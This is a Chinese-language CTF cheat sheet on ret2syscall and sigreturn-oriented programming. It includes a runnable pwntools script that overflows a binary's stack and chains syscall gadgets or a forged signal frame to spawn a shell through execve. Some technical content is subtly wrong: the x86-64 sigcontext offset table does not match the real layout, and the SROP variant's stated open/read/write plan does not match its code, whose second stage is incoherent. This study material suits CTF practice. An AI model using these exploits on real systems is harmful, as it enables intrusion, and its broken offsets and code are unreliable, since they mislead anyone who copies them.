---
title: ret2syscall 与 SROP 全寄存器控制
category: pwn
tags: [ret2syscall, SROP, sigreturn, execve, 静态链接]
signals: [静态链接无 libc 符号, 只有 syscall 无 system, 栈溢出空间很小, read 长度只有 0x10, 有 int 0x80 gadget, 二进制里找不到 pop rdi, 题目给了 seccomp 但只允许 read/write]
difficulty: medium
source: "CTF-Wiki SROP / ir0nstone SROP / angr-doc"
tools: [pwntools, ROPgadget, ropper, gdb]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- `file ./pwn` 显示 `statically linked`，`ldd` 报 `not a dynamic executable`。
- 二进制里没有 `system`，但有 `syscall` / `int 0x80` 指令。
- ROPgadget 搜 `pop rdi` 能找到，但 `pop rsi` / `pop rdx` 缺失或距离太远。
- 溢出空间极小（只能覆盖返回地址后 0x10~0x20 字节），放不下完整 ROP 链。
- 存在 `mov eax, 0xf; int 0x80`（或 `syscall`）序言，即 `sigreturn` 被调用过。
- 逆向看到 `__libc_sigaction` / `rt_sigreturn` 相关代码。

## 二、原理

**ret2syscall**：不走 libc，直接布置寄存器后执行 `syscall`。

```text
execve("/bin/sh", 0, 0):
  x86-64:  rax=59, rdi=ptr("/bin/sh"), rsi=0, rdx=0, syscall
  i386:    eax=11, ebx=ptr("/bin/sh"), ecx=0, edx=0, int 0x80
```

寄存器需要 `pop rdi/rsi/rdx/rax` gadget 链。当 gadget 不足时，改用：

**SROP（Sigreturn-Oriented Programming）**：内核在收到信号时把**全部寄存器**压到栈上形成 `sigframe`；进程执行 `rt_sigreturn`（x86-64 为 `rax=15`）时，内核从用户栈恢复所有寄存器。只要我们伪造 `sigframe` 并触发 `syscall; ret`（rax=15），就能**一次性设置全部寄存器**，绕过 gadget 稀缺问题。

`sigcontext` 关键字段顺序（x86-64，`SigreturnFrame`）：

```text
offset 0x00  uc_flags
offset 0x08  &uc
...（fpstate 区）
offset 0xa0  r8
offset 0xa8  r9
offset 0xb0  r10
offset 0xb8  r11
offset 0xc0  r12
offset 0xc8  r13
offset 0xd0  r14
offset 0xd8  r15
offset 0xe0  rdi
offset 0xe8  rsi
offset 0xf0  rbp
offset 0xf8  rbx
offset 0x100 rdx
offset 0x108 rax      ← 设为 59 就变成 execve
offset 0x110 rcx
offset 0x118 rsp
offset 0x120 rip      ← 下一条指令
...
```

pwntools 的 `SigreturnFrame()` 会自动算好对齐，不要手搓偏移。

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: found  NX: enabled  PIE: enabled/disabled  静态链接
```

判读要点：

1. 静态链接 ⇒ 无 libc 符号 ⇒ 用 `elf.search(asm('syscall; ret'))` 找 syscall gadget。
2. `pop rax` 常见，但完整的 `pop rdi/rsi/rdx` 三件套可能缺，此时正是 SROP 的场合。
3. `sigreturn` 只要求**能设置 rax=15 并执行 syscall**，其余寄存器由 frame 决定 ⇒ 极小溢出空间也能打。
4. 若 `seccomp` 只放行 `read/write/open`，SROP 正好用来做 **open/read/write** 三步（见 seccomp 篇）。
5. 32 位 `int 0x80` 下 `eax=0x77` 即 `sigreturn`，frame 结构为 `sigcontext`（`SYS_sigreturn`）。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE \
           else process()

PADDING  = b"A" * 0x48                       # 占位：实测偏移
rop      = ROP(elf)
SYSCALL  = rop.find_gadget(["syscall", "ret"]).address
POP_RDI  = rop.find_gadget(["pop rdi", "ret"]).address
POP_RSI  = rop.find_gadget(["pop rsi", "ret"]).address
POP_RDX  = rop.find_gadget(["pop rdx", "ret"]).address
POP_RAX  = rop.find_gadget(["pop rax", "ret"]).address
BINSH    = next(elf.search(b"/bin/sh\x00"))

# ---------- 变体 A：ret2syscall（gadget 齐全） ----------
def exp_ret2syscall(p):
    payload  = PADDING
    payload += p64(POP_RAX) + p64(59)        # execve
    payload += p64(POP_RDI) + p64(BINSH)     # path
    payload += p64(POP_RSI) + p64(0)         # argv
    payload += p64(POP_RDX) + p64(0)         # envp
    payload += p64(SYSCALL)
    p.sendline(payload)

# ---------- 变体 B：SROP（gadget 不足 / 空间极小） ----------
def exp_srop(p, n_read=0x400, target=b"./flag"):
    """
    思路：1) read(0, bss, 0x400) 把 frame + 字符串读进 bss
          2) rax=15 → syscall 触发 rt_sigreturn
          3) frame 中 rip 指向 syscall; 寄存器布置成 execve
    这里给「一次 read 塞满 + sigreturn 直接 open/read/write」的通用写法。
    """
    bss  = elf.bss(0x100)
    frame = SigreturnFrame()
    frame.rax = constants.SYS_read        # 若不需要预先 read，可改为 SYS_execve
    frame.rdi = 0
    frame.rsi = bss + 0x200
    frame.rdx = n_read
    frame.rsp = bss + 0x200
    frame.rip = SYSCALL

    payload  = PADDING
    payload += p64(POP_RAX) + p64(15)     # rt_sigreturn
    payload += p64(SYSCALL)
    payload += bytes(frame)
    assert b"\n" not in payload, "payload 含换行，会被 gets/readline 截断"
    p.send(payload)

    # 第二段：把打开的 fd 内容读到可写区再写回 stdout
    chain  = p64(POP_RAX) + p64(0) + p64(POP_RDI) + p64(bss + 0x400) \
           + p64(POP_RSI) + p64(0) + p64(SYSCALL)   # read(0, dst, 0)
    p.send(b"/bin/sh\x00" + chain.ljust(0x100, b"\x00"))


# ---------- 变体 C：execveat / ORW 连续 syscall 封装 ----------
def syscall_seq(regs_seq):
    """regs_seq: [(rax,rdi,rsi,rdx), ...] -> ROP 链"""
    chain = b""
    for rax, rdi, rsi, rdx in regs_seq:
        if rax is not None: chain += p64(POP_RAX) + p64(rax)
        if rdi is not None: chain += p64(POP_RDI) + p64(rdi)
        if rsi is not None: chain += p64(POP_RSI) + p64(rsi)
        if rdx is not None: chain += p64(POP_RDX) + p64(rdx)
        chain += p64(SYSCALL)
    return chain

if __name__ == "__main__":
    p = start()
    exp_srop(p)
    p.interactive()
```

32 位 `int 0x80` 版本（eax=0x0b 为 execve）：

```python
def exp_ret2syscall32(p):
    payload  = b"A" * 0x6c
    payload += p32(POP_EAX) + p32(0x0b)
    payload += p32(POP_EBX) + p32(BINSH)
    payload += p32(POP_ECX) + p32(0)
    payload += p32(POP_EDX) + p32(0)
    payload += p32(INT80)
    p.sendline(payload)
```

## 五、常见坑 / 变体

- **`sigreturn` 的 frame 被截断**：`read` 读不够会得到半截 frame，务必保证 `read` 长度 ≥ `len(bytes(frame))`（x86-64 约 248 字节）。
- **`sigframe` 里有 `\n`（0x0a）**：`gets`/`scanf` 会截断，改用 `read`，或微调 `rsp`/`rip` 避开。
- **`movaps` 崩溃**：SROP 的 `frame.rsp` 需 16 字节对齐，`bss+0x200` 这类地址天然对齐。
- **`rt_sigreturn` 被限制**：内核 `CONFIG_COMPAT` 或某些沙箱里 `rax=15` 返回 `-EINVAL`，改用纯 ret2syscall。
- **`/bin/sh` 不存在**：静态程序里可能没有该字符串，用 `write` 自己写进 `.bss`（`elf.bss()` + `read`）。
- **`execve` 被 seccomp 禁**：走 `open/read/write`（`SYS_open`=2 / `SYS_openat`=257）。
- **ret2dlresolve 替代**：无 syscall 但也无 system 时，伪造 `Elf64_Rela` 让链接器替你 `system`。

## 六、参考来源

- [CTF-Wiki: ret2syscall / 基本 ROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)
- [CTF-Wiki: SROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/)
- [CTF-Wiki: ret2dlresolve](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/)
- [ir0nstone: Syscalls 与利用](https://ir0nstone.gitbook.io/notes/binexp/stack/syscalls/exploitation-with-syscalls)
- [ir0nstone: Sigreturn-Oriented Programming](https://ir0nstone.gitbook.io/notes/binexp/stack/syscalls/sigreturn-oriented-programming-srop)
- [Wikipedia: Sigreturn-oriented programming](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming)
- [man 2 signal（signal frame 结构）](https://man7.org/linux/man-pages/man7/signal.7.html)
